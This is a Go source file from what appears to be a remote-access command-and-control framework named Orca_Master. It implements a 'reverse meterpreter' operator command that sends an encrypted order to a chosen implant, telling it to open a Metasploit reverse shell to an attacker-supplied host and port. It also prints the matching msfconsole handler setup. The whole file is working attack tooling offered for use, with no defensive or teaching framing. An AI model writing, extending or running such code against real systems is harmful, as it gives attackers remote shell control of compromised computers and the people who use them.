package controller

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"encoding/json"
	"fmt"
	"github.com/desertbit/grumble"
	"net"
	"strings"
	"time"
)

var reverseCmd = &grumble.Command{
	Name:  "reverse",
	Help:  "reverse shell",
	Usage: "reverse meterpreter [-h | --help]",
}

var reverseMeterperterCmd = &grumble.Command{
	Name:    "meterpreter",
	Aliases: []string{"msf"},
	Help:    "reverse meterpreter",
	Usage:   "reverse meterpreter [-h | --help] [-t | --transport transport] [-H | --host ip:port]",
	Flags: func(f *grumble.Flags) {
		f.String("t", "transport", "tcp", "msf payload transport type [tcp http https]")
		f.String("H", "host", "", "msf lhost:lport")
	},
	Run: func(c *grumble.Context) error {
		type MeterpreterStruct struct {
			Transport string
			Host      string
		}
		transport := c.Flags.String("transport")
		host := c.Flags.String("host")
		if len(host) == 0 {
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "host cannot be empty")
			return nil
		}
		_, err := net.ResolveTCPAddr("tcp4", host)
		if err != nil {
			message := fmt.Sprintf("Invalid host address [%s]", err)
			colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
			return nil
		}
		msf := MeterpreterStruct{
			Transport: transport,
			Host:      host,
		}
		msfjson, _ := json.Marshal(msf)
		data, _ := crypto.Encrypt(msfjson, []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "reverseMeterpreter", data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request failed")
			return nil
		}
		var (
			platform = ""
			arch     = ""
			payload  = ""
			lhost    = ""
			lport    = ""
		)
		lhost, lport, _ = strings.Cut(host, ":")
		if SelectVer[:7] == "windows" {
			platform = "windows"
			if SelectVer[len(SelectVer)-5:] == "amd64" {
				arch = "x64/"
			}
		}
		if SelectVer[:5] == "linux" {
			platform = "linux"
			if SelectVer[len(SelectVer)-5:] == "amd64" {
				arch = "x64/"
			}
			if SelectVer[len(SelectVer)-3:] == "386" {
				arch = "x86/"
			}
		}
		payload = fmt.Sprintf("%s/%smeterpreter/reverse_%s", platform, arch, transport)
		select {
		case msg := <-common.DefaultMsgChan:
			_, _, data := common.SettleRetDataBt(msg)
			_, _, retData := common.SettleRetDataEx(msg)
			fmt.Println(string(data))
			if retData.Code != retcode.SUCCESS {
				colorcode.PrintMessage(colorcode.SIGN_NOTICE, "you can run the following commands in msfconsole: ")
				fmt.Println("use exploit/multi/handler")
				fmt.Printf("set payload %s\n", payload)
				fmt.Printf("set lhost %s\n", lhost)
				fmt.Printf("set lport %s\n", lport)
				return nil
			}
		case <-time.After(10 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_ERROR, "request timed out")
			return nil
		}
		return nil
	},
}
